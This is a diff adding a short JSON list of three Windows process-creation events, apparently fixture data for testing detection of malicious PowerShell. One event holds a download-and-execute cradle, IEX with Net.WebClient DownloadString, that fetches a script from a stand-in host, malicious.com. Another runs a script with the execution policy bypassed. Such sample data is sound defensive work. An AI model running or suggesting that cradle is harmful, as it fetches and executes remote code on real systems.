@@ -1,0 +1,26 @@
+[
+    {
+        "EventID": 4688,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\malicious.ps1",
+        "User": "CORP\\User",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "ProcessId": 2345
+    },
+    {
+        "EventID": 4688,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
+        "User": "CORP\\Admin",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ProcessId": 3456
+    },
+    {
+        "EventID": 4688,
+        "Image": "C:\\Windows\\System32\\conhost.exe",
+        "CommandLine": "conhost.exe",
+        "User": "CORP\\User",
+        "ParentImage": "C:\\Windows\\System32\\csrss.exe",
+        "ProcessId": 4567
+    }
+]
